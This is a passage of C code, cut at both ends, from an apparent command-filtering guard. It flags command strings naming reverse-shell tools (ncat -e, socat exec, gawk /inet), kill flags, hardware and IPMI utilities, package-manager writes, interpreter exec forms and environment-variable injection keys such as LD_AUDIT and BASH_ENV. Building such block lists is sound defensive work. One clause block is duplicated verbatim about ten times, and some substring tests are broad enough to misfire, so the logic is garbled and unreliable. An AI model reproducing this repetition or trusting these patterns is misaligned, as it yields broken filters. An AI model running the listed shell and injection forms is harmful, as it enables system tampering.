              ci_contains(text, " umount") || ci_contains(text, " insmod") ||
              ci_contains(text, " modprobe") || ci_contains(text, " ifconfig") ||
              ci_contains(text, " route") || ci_contains(text, " crond") ||
              ci_contains(text, " adduser") || ci_contains(text, " chroot"))) ||
            (ci_contains(text, "ncat") &&
             (ci_contains(text, " -e") || ci_contains(text, " -c"))) ||
            (ci_contains(text, "socat") &&
             (ci_contains(text, " exec") || ci_contains(text, " system") ||
              ci_contains(text, " proxy") || ci_contains(text, " socks") ||
              ci_contains(text, " tun"))) ||
            (ci_contains(text, "gawk") && ci_contains(text, "/inet")) ||
            (ci_contains(text, "ruby") &&
             (ci_contains(text, " -e") || ci_contains(text, " -rsocket") ||
              ci_contains(text, " -rwebrick") || ci_contains(text, " -run") ||
              ci_contains(text, " -i"))) ||
            /* process kill flags */
            (ci_contains(text, "pkill") &&
             (ci_contains(text, " -9") || ci_contains(text, " -kill") ||
              ci_contains(text, " -term") || ci_contains(text, " -stop"))) ||
            (ci_contains(text, "killall") &&
             (ci_contains(text, " -9") || ci_contains(text, " -kill") ||
              ci_contains(text, " -term") || ci_contains(text, " -stop"))) ||
            (ci_contains(text, "skill") &&
             (ci_contains(text, " -9") || ci_contains(text, " -kill") ||
              ci_contains(text, " -term") || ci_contains(text, " -stop"))) ||
            /* service registration + wsl */
            ci_contains(text, "update-rc.d") || ci_contains(text, "insserv") ||
            ci_contains(text, "sysv-rc-conf") ||
            (ci_contains(text, "initctl") &&
             (ci_contains(text, " emit") || ci_contains(text, " start") ||
              ci_contains(text, " stop") || ci_contains(text, " restart") ||
              ci_contains(text, " reload"))) ||
            (ci_contains(text, "wsl") &&
             (ci_contains(text, " -d") || ci_contains(text, " -e") ||
              ci_contains(text, ".exe") || ci_contains(text, " --exec") ||
              ci_contains(text, " --cd") || ci_contains(text, " --shell") ||
              ci_contains(text, " --user") || ci_contains(text, " -u") ||
              ci_contains(text, " --system") || ci_contains(text, " --terminate") ||
              ci_contains(text, " --shutdown") || ci_contains(text, " --mount") ||
              ci_contains(text, " --export") || ci_contains(text, " --import") ||
              ci_contains(text, " --set") || ci_contains(text, " --install") ||
              ci_contains(text, " --update"))) ||
            /* hardware / pci / msr / physmem / ipmi-freeipmi / usbmux / mediatek / sdr-voip */
            ci_contains(text, "devmem2") || ci_contains(text, "devmem") ||
            ci_contains(text, "memtool") || ci_contains(text, "iotools") ||
            ci_contains(text, "rdmsr") || ci_contains(text, "wrmsr") ||
            ci_contains(text, "x86info") ||
            (ci_contains(text, "setpci") &&
             (ci_contains(text, "=") || ci_contains(text, " -w"))) ||
            (ci_contains(text, "pciconf") && ci_contains(text, " -w")) ||
            ci_contains(text, "pivot_root") ||
            (ci_contains(text, "watchdog") && ci_contains(text, " -")) ||
            ci_contains(text, "wdctl") || ci_contains(text, "bmc-device") ||
            ci_contains(text, "ipmi-sel") || ci_contains(text, "ipmi-chassis") ||
            ci_contains(text, "bmc-config") || ci_contains(text, "ipmi-oem") ||
            ci_contains(text, "ipmi_ui") || ci_contains(text, "ipmilan") ||
            ci_contains(text, "ipmi-fru") || ci_contains(text, "ipmi-sensors") ||
            ci_contains(text, "ipmi-locate") || ci_contains(text, "ipmi-ping") ||
            ci_contains(text, "ipmi-detect") || ci_contains(text, "ipmi-console") ||
            ci_contains(text, "ipmishell") || ci_contains(text, "pef-config") ||
            ci_contains(text, "bmc-info") || ci_contains(text, "bmc-watchdog") ||
            ci_contains(text, "ipmi-raw") || ci_contains(text, "ipmi-time") ||
            ci_contains(text, "ipmimonitoring") || ci_contains(text, "rmcp-ping") ||
            ci_contains(text, "usbmuxd") || ci_contains(text, "flash_tool") ||
            ci_contains(text, "ch341prog") || ci_contains(text, "minipro") ||
            ci_contains(text, "dump1090") || ci_contains(text, "gr-gsm") ||
            ci_contains(text, "sipp") || ci_contains(text, "pjsua") ||
            ci_contains(text, "baresip") || ci_contains(text, "linphonec") ||
            ci_contains(text, "voipong") || ci_contains(text, "voiphopper") ||
            ci_contains(text, "ucsniff") || ci_contains(text, "enumiax") ||
            ci_contains(text, "iaxflood") || ci_contains(text, "rtpbreak") ||
            ci_contains(text, "rtpsend") || ci_contains(text, "siparmyknife") ||
            /* nvme/mmc deep ops */
            (ci_contains(text, "nvme") &&
             (ci_contains(text, " fw-download") || ci_contains(text, " admin-passthru") ||
              ci_contains(text, " io-passthru") || ci_contains(text, " attach") ||
              ci_contains(text, " detach") || ci_contains(text, " reset") ||
              ci_contains(text, " rescan") || ci_contains(text, " write-zeroes") ||
              ci_contains(text, " write-uncor") || ci_contains(text, " dsm") ||
              ci_contains(text, " security-send") || ci_contains(text, " security-recv") ||
              ci_contains(text, " set-feature") || ci_contains(text, " ns-rescan") ||
              ci_contains(text, " dir-receive") || ci_contains(text, " sanitize-log") ||
              ci_contains(text, " get-lba-status") || ci_contains(text, " format-nvm"))) ||
            (ci_contains(text, "mmc") &&
             (ci_contains(text, " erase") || ci_contains(text, " sanitize") ||
              ci_contains(text, " hwreset") || ci_contains(text, " rpmb") ||
              ci_contains(text, " ffu") || ci_contains(text, " extcsd") ||
              ci_contains(text, " bootpart") || ci_contains(text, " writeprotect") ||
              ci_contains(text, " cache") || ci_contains(text, " bkops") ||
              ci_contains(text, " gen_cmd") || ci_contains(text, " csd") ||
              ci_contains(text, " testarea") || ci_contains(text, " scr"))) ||
            /* package-manager write ops: snap/flatpak/brew/nix/guix/pipx-uv/conda/composer/deno/bun/go/cargo */
            (ci_contains(text, "snap") &&
             (ci_contains(text, " connect") || ci_contains(text, " disconnect") ||
              ci_contains(text, " set ") || ci_contains(text, " unset") ||
              ci_contains(text, " disable") || ci_contains(text, " enable") ||
              ci_contains(text, " refresh") || ci_contains(text, " revert") ||
              ci_contains(text, " download") || ci_contains(text, " ack") ||
              ci_contains(text, " known") || ci_contains(text, " login") ||
              ci_contains(text, " logout") || ci_contains(text, " create-user") ||
              ci_contains(text, " watch") || ci_contains(text, " abort") ||
              ci_contains(text, " try"))) ||
            (ci_contains(text, "flatpak") &&
             (ci_contains(text, " remote-add") || ci_contains(text, " remote-delete") ||
              ci_contains(text, " remote-modify") || ci_contains(text, " uninstall") ||
              ci_contains(text, " kill") || ci_contains(text, " enter") ||
              ci_contains(text, " repair") || ci_contains(text, " update") ||
              ci_contains(text, " mask") || ci_contains(text, " unmask") ||
              ci_contains(text, " make-current") || ci_contains(text, " create-usb") ||
              ci_contains(text, " permission-") || ci_contains(text, " document-") ||
              ci_contains(text, " metadata") || ci_contains(text, " config") ||
              ci_contains(text, " build-sign") || ci_contains(text, " build-import") ||
              ci_contains(text, " build-export") || ci_contains(text, " --system") ||
              ci_contains(text, " --user"))) ||
            (ci_contains(text, "brew") &&
             (ci_contains(text, " link") || ci_contains(text, " unlink") ||
              ci_contains(text, " tap ") || ci_contains(text, " untap") ||
              ci_contains(text, " services") || ci_contains(text, " reinstall") ||
              ci_contains(text, " uninstall") || ci_contains(text, " developer") ||
              ci_contains(text, " cask install") || ci_contains(text, " cask uninstall"))) ||
            (ci_contains(text, "nix-env") &&
             (ci_contains(text, " -e") || ci_contains(text, " --uninstall") ||
              ci_contains(text, " --delete-generations") || ci_contains(text, " -i") ||
              ci_contains(text, " --install") || ci_contains(text, " --rollback") ||
              ci_contains(text, " --switch") || ci_contains(text, " --upgrade") ||
              ci_contains(text, " --set-flag") || ci_contains(text, " --profile") ||
              ci_contains(text, " --remove-all"))) ||
            (ci_contains(text, "nix-collect-garbage") ||
             ci_contains(text, "nix-channel") || ci_contains(text, "nix-build") ||
             ci_contains(text, "nix-instantiate") || ci_contains(text, "nix-store") ||
             ci_contains(text, "nix-copy")) ||
            (ci_contains(text, "nix") &&
             (ci_contains(text, " run") || ci_contains(text, " shell") ||
              ci_contains(text, " profile") ||
              ci_contains(text, " store") || ci_contains(text, " gc") ||
              ci_contains(text, " registry") || ci_contains(text, " flake update") ||
              ci_contains(text, " flake new") || ci_contains(text, " flake init") ||
              ci_contains(text, " flake archive") ||
              ci_contains(text, " eval") || ci_contains(text, " bundle") ||
              ci_contains(text, " copy"))) ||
            (ci_contains(text, "uv") &&
             (ci_contains(text, " run") || ci_contains(text, " tool") ||
              ci_contains(text, " pip") || ci_contains(text, " sync") ||
              ci_contains(text, " add") || ci_contains(text, " remove") ||
              ci_contains(text, " build") || ci_contains(text, " publish") ||
              ci_contains(text, " init"))) ||
            ci_contains(text, "uvx") ||
            (ci_contains(text, "conda") &&
             (ci_contains(text, " install") || ci_contains(text, " remove") ||
              ci_contains(text, " create") || ci_contains(text, " env") ||
              ci_contains(text, " run") || ci_contains(text, " activate") ||
              ci_contains(text, " update") || ci_contains(text, " uninstall") ||
              ci_contains(text, " clean") || ci_contains(text, " config") ||
              ci_contains(text, " init") || ci_contains(text, " rename"))) ||
            (ci_contains(text, "mamba") &&
             (ci_contains(text, " install") || ci_contains(text, " remove") ||
              ci_contains(text, " create") || ci_contains(text, " run") ||
              ci_contains(text, " update") || ci_contains(text, " clean") ||
              ci_contains(text, " init"))) ||
            (ci_contains(text, "composer") &&
             (ci_contains(text, " install") || ci_contains(text, " require") ||
              ci_contains(text, " update") || ci_contains(text, " remove") ||
              ci_contains(text, " global") || ci_contains(text, " exec") ||
              ci_contains(text, " run") || ci_contains(text, " create-project") ||
              ci_contains(text, " dump-autoload") || ci_contains(text, " config"))) ||
            (ci_contains(text, "deno") &&
             (ci_contains(text, " install") || ci_contains(text, " compile") ||
              ci_contains(text, " eval") || ci_contains(text, " task") ||
              ci_contains(text, " bundle") || ci_contains(text, " upgrade") ||
              ci_contains(text, " add") || ci_contains(text, " remove") ||
              ci_contains(text, " uninstall") || ci_contains(text, " vendor"))) ||
            (ci_contains(text, "bun ") &&
             (ci_contains(text, "run ") || ci_contains(text, "add ") ||
              ci_contains(text, "remove ") || ci_contains(text, "install ") ||
              ci_contains(text, "build ") || ci_contains(text, "pm ") ||
              ci_contains(text, "x ") ||
              ci_contains(text, "create ") || ci_contains(text, "init ") ||
              ci_contains(text, "upgrade ") || ci_contains(text, "--bun"))) ||
            (ci_contains(text, "go ") && !ci_contains(text, "cargo") &&
             (ci_contains(text, "mod ") || ci_contains(text, "work ") ||
              ci_contains(text, "generate") || ci_contains(text, "get ") ||
              ci_contains(text, "install") || ci_contains(text, "run ") ||
              ci_contains(text, "tool") || ci_contains(text, "env -w"))) ||
            (ci_contains(text, "rustc") &&
             (ci_contains(text, " --emit") || ci_contains(text, " -o") ||
              ci_contains(text, " --crate"))) ||
            /* language runtimes / interp exec */
            ci_contains(text, "jrunscript") || ci_contains(text, "jjs") ||
            ci_contains(text, "hhvm") || ci_contains(text, "php-cgi") ||
            ci_contains(text, "qjs") || ci_contains(text, "d8 ") ||
            ci_contains(text, "jsc ") || ci_contains(text, "mujs") ||
            ci_contains(text, "duktape") || ci_contains(text, "graaljs") ||
            ci_contains(text, "hermes") ||
            (ci_contains(text, "mono") &&
             (ci_contains(text, ".exe") || ci_contains(text, ".dll"))) ||
            ci_contains(text, "runghc") || ci_contains(text, "runhaskell") ||
            (ci_contains(text, "ghci") &&
             (ci_contains(text, " -e") || ci_contains(text, " -ghci") ||
              ci_contains(text, " :") || ci_contains(text, " .hs"))) ||
            ci_contains(text, "jython") ||
            ci_contains(text, "jruby") || ci_contains(text, "raku") ||
            ci_contains(text, "rakudo") ||
            (ci_contains(text, "guile") &&
             (ci_contains(text, " -c") || ci_contains(text, " -l") ||
              ci_contains(text, " -s") || ci_contains(text, " --eval") ||
              ci_contains(text, " .scm"))) ||
            ci_contains(text, "sbcl") || ci_contains(text, "clisp") ||
            ci_contains(text, "ecl ") || ci_contains(text, "gcl ") ||
            (ci_contains(text, "racket") &&
             (ci_contains(text, " -e") || ci_contains(text, " -f") ||
              ci_contains(text, " -t") || ci_contains(text, " -i") ||
              ci_contains(text, " -l") || ci_contains(text, " .rkt") ||
              ci_contains(text, " --eval"))) ||
            (ci_contains(text, "chez") &&
             (ci_contains(text, " --") || ci_contains(text, " -") ||
              ci_contains(text, " .ss") || ci_contains(text, " .scm"))) ||
            ci_contains(text, "mit-scheme") || ci_contains(text, "chibi-scheme") ||
            ci_contains(text, "bigloo") || ci_contains(text, " gosh ") ||
            ci_contains(text, "newlisp") || ci_contains(text, "picolisp") ||
            (ci_contains(text, "janet") &&
             (ci_contains(text, " -e") || ci_contains(text, " -l") ||
              ci_contains(text, " -d") || ci_contains(text, " -c") ||
              ci_contains(text, " -m") || ci_contains(text, " -k") ||
              ci_contains(text, " -p") || ci_contains(text, " .janet") ||
              ci_contains(text, " .jdn") || ci_contains(text, " --"))) ||
            (ci_contains(text, "fennel") &&
             (ci_contains(text, " --eval") || ci_contains(text, " -e") ||
              ci_contains(text, " .fnl") || ci_contains(text, " --"))) ||
            ci_contains(text, " hy ") || ci_contains(text, "bb -e") ||
            ci_contains(text, "bb -m") || ci_contains(text, "gforth") ||
            ci_contains(text, "pforth") || ci_contains(text, "rexx") ||
            ci_contains(text, "regina") || ci_contains(text, "swipl") ||
            ci_contains(text, "gprolog") || ci_contains(text, "tclsh") ||
            ci_contains(text, "jimtcl") || ci_contains(text, "kscript") ||
            ci_contains(text, "kotlinc") || ci_contains(text, "bsh.") ||
            ci_contains(text, "rscript") || ci_contains(text, "r -e") ||
            (ci_contains(text, "julia") &&
             (ci_contains(text, " -e") || ci_contains(text, " -p") ||
              ci_contains(text, " -o") || ci_contains(text, " -g") ||
              ci_contains(text, " --eval") || ci_contains(text, " .jl"))) ||
            (ci_contains(text, "octave") &&
             (ci_contains(text, " --eval") || ci_contains(text, " -p") ||
              ci_contains(text, " --no-gui") || ci_contains(text, " --silent") ||
              ci_contains(text, " -w") || ci_contains(text, " .m"))) ||
            ci_contains(text, "scilab") ||
            (ci_contains(text, "maxima") &&
             (ci_contains(text, " -b") || ci_contains(text, " -r") ||
              ci_contains(text, " --batch") || ci_contains(text, " --eval"))) ||
            ci_contains(text, "sage ") || ci_contains(text, " gp ") ||
            ci_contains(text, "luajit") ||
            ci_contains(text, "tarantool") || ci_contains(text, "cling") ||
            ci_contains(text, "cint") ||
            (ci_contains(text, "nim") &&
             (ci_contains(text, " r") || ci_contains(text, " c") ||
              ci_contains(text, " e") || ci_contains(text, " compile") ||
              ci_contains(text, " secret") || ci_contains(text, " js"))) ||
            (ci_contains(text, "nimble") &&
             (ci_contains(text, " install") || ci_contains(text, " remove") ||
              ci_contains(text, " build") || ci_contains(text, " run") ||
              ci_contains(text, " task"))) ||
            (ci_contains(text, "crystal") &&
             (ci_contains(text, " run") || ci_contains(text, " eval") ||
              ci_contains(text, " build") || ci_contains(text, " tool"))) ||
            (ci_contains(text, "zig") &&
             (ci_contains(text, " run") || ci_contains(text, " cc") ||
              ci_contains(text, " c++") || ci_contains(text, " test"))) ||
            (ci_contains(text, "odin") &&
             (ci_contains(text, " run") || ci_contains(text, " build") ||
              ci_contains(text, " check"))) ||
            (ci_contains(text, "v run") || ci_contains(text, "v -o") ||
             ci_contains(text, "v build") || ci_contains(text, "hare run") ||
             ci_contains(text, "hare build")) ||
            ci_contains(text, "tsx") || ci_contains(text, "ts-node") ||
            ci_contains(text, "vite-node") || ci_contains(text, "swc ") ||
            (ci_contains(text, "stack") &&
             (ci_contains(text, " run") || ci_contains(text, " exec") ||
              ci_contains(text, " script") || ci_contains(text, " ghci"))) ||
            (ci_contains(text, "cabal") &&
             (ci_contains(text, " run") || ci_contains(text, " exec") ||
              ci_contains(text, " install") || ci_contains(text, " repl"))) ||
            ci_contains(text, "rust-script") || ci_contains(text, "evcxr") ||
            ci_contains(text, "ensurepip") ||
            (ci_contains(text, "cpan") &&
             (ci_contains(text, " install") || ci_contains(text, " -i") ||
              ci_contains(text, " -t") || ci_contains(text, " -d"))) ||
            ci_contains(text, "cpanm") ||
            /* ssh option/exec forms */
            (ci_contains(text, "ssh") &&
             (ci_contains(text, " -j") || ci_contains(text, " -w") ||
              ci_contains(text, " -a") || ci_contains(text, " -o remotecommand") ||
              ci_contains(text, " -o setenv") || ci_contains(text, " -o requestty") ||
              ci_contains(text, " -o forwardagent") || ci_contains(text, " -o proxyjump") ||
              ci_contains(text, " -o sendenv") || ci_contains(text, " -o permit"))) ||
            /* env-var injection keys (value-bound) */
            strstr(text, "BASH_ENV=/") || strstr(text, "PROMPT_COMMAND=") ||
            strstr(text, "EDITOR=/") || strstr(text, "VISUAL=/") ||
            strstr(text, "SUDO_EDITOR=/") || strstr(text, "FCEDIT=/") ||
            strstr(text, "GIT_EDITOR=/") || strstr(text, "GIT_DIR=/") ||
            strstr(text, "GIT_EXEC_PATH=/") || strstr(text, "GIT_TEMPLATE_DIR=/") ||
            strstr(text, "GIT_WORK_TREE=/") || strstr(text, "GIT_INDEX_FILE=/") ||
            strstr(text, "GIT_OBJECT_DIRECTORY=/") || strstr(text, "GIT_CONFIG=/") ||
            strstr(text, "GIT_CONFIG_PARAMETERS=") || strstr(text, "GIT_SSH=") ||
            strstr(text, "GIT_PAGER=/") || strstr(text, "PERL5LIB=") ||
            strstr(text, "PERL5OPT=-") || strstr(text, "PERL5DB=") ||
            strstr(text, "PYTHONSTARTUP=/") || strstr(text, "PYTHONPATH=") ||
            strstr(text, "PYTHONHOME=/") || strstr(text, "NODE_OPTIONS=-") ||
            strstr(text, "NODE_PATH=") || strstr(text, "RUBYLIB=") ||
            strstr(text, "RUBYOPT=") || strstr(text, "ZDOTDIR=/") ||
            strstr(text, "SUDO_ASKPASS=/") || strstr(text, "SSH_AUTH_SOCK=/") ||
            strstr(text, "QT_IM_MODULE=") || strstr(text, "GTK_IM_MODULE=") ||
            strstr(text, "XMODIFIERS=") || strstr(text, "GLIBC_TUNABLES=") ||
            strstr(text, "LOCPATH=") || strstr(text, "TZDIR=/") ||
            strstr(text, "HOSTALIASES=/") || strstr(text, "KRB5_CONFIG=/") ||
            strstr(text, "KRB5_KTNAME=") || strstr(text, "KRB5CCNAME=") ||
            strstr(text, "PKCS11_MODULE_PATH=") || strstr(text, "MANPAGER=") ||
            strstr(text, "SYSTEMD_PAGER=") || strstr(text, "LD_AUDIT=") ||
            strstr(text, "LD_PROFILE=") || strstr(text, "DISPLAY=:") ||
            strstr(text, "XAUTHORITY=/") || strstr(text, "BROWSER=") ||
            strstr(text, "GPG_AGENT_INFO=") || strstr(text, "PINENTRY")
        ) {
                    what = "time/procfs/kernel/tamper/exec-runtime primitive";
        }
    else if (ci_contains(text, "xhost") ||
             (ci_contains(text, "xauth") &&
              (ci_contains(text, " add") || ci_contains(text, " merge") ||
               ci_contains(text, " extract") || ci_contains(text, " generate") ||
               ci_contains(text, " -f") || ci_contains(text, " nextract") ||
               ci_contains(text, " nmerge"))) ||
             ci_contains(text, "mcookie") ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             (ci_contains(text, "lvm") &&
              (ci_contains(text, " pv") || ci_contains(text, " vg") ||
               ci_contains(text, " lv") || ci_contains(text, " remove") ||
               ci_contains(text, " create") || ci_contains(text, " -"))) ||
             ci_contains(text, "mavlink") || ci_contains(text, "pastebin") ||
             ci_contains(text, "packagekit") || ci_contains(text, "openssl ca") ||
             (ci_contains(text, "dnf ") &&
              (ci_contains(text, " system-upgrade") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " autoremove") || ci_contains(text, " distro-sync") ||
               ci_contains(text, " check"))) ||
             ci_contains(text, "synergyc") || ci_contains(text, "synergys") ||
             ci_contains(text, "barrierc") || ci_contains(text, "barriers") ||
             ci_contains(text, "ydotool") || ci_contains(text, "wtype") ||
             ci_contains(text, "dotool") ||
             ci_contains(text, "evemu-event") || ci_contains(text, "evemu-play") ||
             (ci_contains(text, "pppd") &&
              (ci_contains(text, " call") || ci_contains(text, " connect") ||
               ci_contains(text, " /dev/") || ci_contains(text, " nodetach"))) ||
             ci_contains(text, "slattach") || ci_contains(text, "minicom") ||
             ci_contains(text, "wvdial") || ci_contains(text, "sendfax") ||
             (ci_contains(text, "gammu") &&
              (ci_contains(text, "send") || ci_contains(text, " --"))) ||
             ci_contains(text, "gnokii") || ci_contains(text, "smstools") ||
             (ci_contains(text, "pand ") &&
              (ci_contains(text, "--listen") || ci_contains(text, "--connect") ||
               ci_contains(text, "--search") || ci_contains(text, "--create") ||
               ci_contains(text, "--persist") || ci_contains(text, "--auth") ||
               ci_contains(text, "--role") || ci_contains(text, "--service"))) ||
             ci_contains(text, "sg_raw") || ci_contains(text, "sg_ses") ||
             ci_contains(text, "sg_opcodes") || ci_contains(text, "sg_requests") ||
             ci_contains(text, "vgcfgrestore") || ci_contains(text, "vgcfgbackup") ||
             ci_contains(text, "pvcreate") || ci_contains(text, "lvmdiskscan") ||
             (ci_contains(text, "multipath") &&
              (ci_contains(text, " -f") || ci_contains(text, " -F") ||
               ci_contains(text, " -c") || ci_contains(text, " -w") ||
               ci_contains(text, " -W"))) ||
             ci_contains(text, "fusermount") ||
             ci_contains(text, "veritysetup") || ci_contains(text, "integritysetup") ||
             (ci_contains(text, "ndctl") &&
              (ci_contains(text, " destroy") || ci_contains(text, " sanitize") ||
               ci_contains(text, " write-labels") || ci_contains(text, " disable") ||
               ci_contains(text, " enable") || ci_contains(text, " zero-labels") ||
               ci_contains(text, " init-labels") || ci_contains(text, " create") ||
               ci_contains(text, " read-labels") || ci_contains(text, " update"))) ||
             ci_contains(text, "ipmctl") || ci_contains(text, "pmempool") ||
             ci_contains(text, "make-bcache") || ci_contains(text, "bcache-super") ||
             (ci_contains(text, "driverctl") &&
              (ci_contains(text, " bind") || ci_contains(text, " unbind") ||
               ci_contains(text, " set-override") || ci_contains(text, " unset"))) ||
             (ci_contains(text, "anacron") &&
              !ci_contains(text, "anacrontab")) ||
             ci_contains(text, "| batch") ||
             ci_contains(text, "inotifywait") || ci_contains(text, "inotifywatch") ||
             ci_contains(text, "acpi_listen") ||
             ci_contains(text, "sbkeysync") || ci_contains(text, "sbvarsign") ||
             ci_contains(text, "direwolf") || ci_contains(text, "axcall") ||
             ci_contains(text, "kissattach") || ci_contains(text, "aprx") ||
             ci_contains(text, "ax25d") || ci_contains(text, "axspawn") ||
             ci_contains(text, "cansend") || ci_contains(text, "candump") ||
             ci_contains(text, "canplayer") || ci_contains(text, "cangen") ||
             ci_contains(text, "cansniffer") || ci_contains(text, "slcan") ||
             ci_contains(text, "obdgpslogger") || ci_contains(text, "cantool") ||
             ci_contains(text, "rosrun") || ci_contains(text, "roslaunch") ||
             ci_contains(text, "rosservice") || ci_contains(text, "rostopic") ||
             ci_contains(text, "rosnode") || ci_contains(text, "rosparam") ||
             ci_contains(text, "mavproxy") || ci_contains(text, "dronekit") ||
             ci_contains(text, "ot-ctl") || ci_contains(text, "ot-cli") ||
             ci_contains(text, "meshtastic") || ci_contains(text, "rnsd") ||
             ci_contains(text, "rnstatus") || ci_contains(text, "lxmf") ||
             ci_contains(text, "bacrp") || ci_contains(text, "bacwi") ||
             ci_contains(text, "bacnet") || ci_contains(text, "knxd") ||
             ci_contains(text, "coap-client") || ci_contains(text, "coap-server") ||
             ci_contains(text, "ttn-lw-cli") ||
             (ci_contains(text, "ipfs") &&
              (ci_contains(text, " add") || ci_contains(text, " daemon") ||
               ci_contains(text, " name") || ci_contains(text, " pin") ||
               ci_contains(text, " publish") || ci_contains(text, " files"))) ||
             ci_contains(text, "zeronet") ||
             ci_contains(text, "freenet") || ci_contains(text, "lokinet") ||
             ci_contains(text, "cjdroute") || ci_contains(text, "i2prouter") ||
             ci_contains(text, "eepget") || ci_contains(text, "gnunet-") ||
             ci_contains(text, "sendxmpp") || ci_contains(text, "profanity") ||
             ci_contains(text, "mcabber") || ci_contains(text, "signal-cli") ||
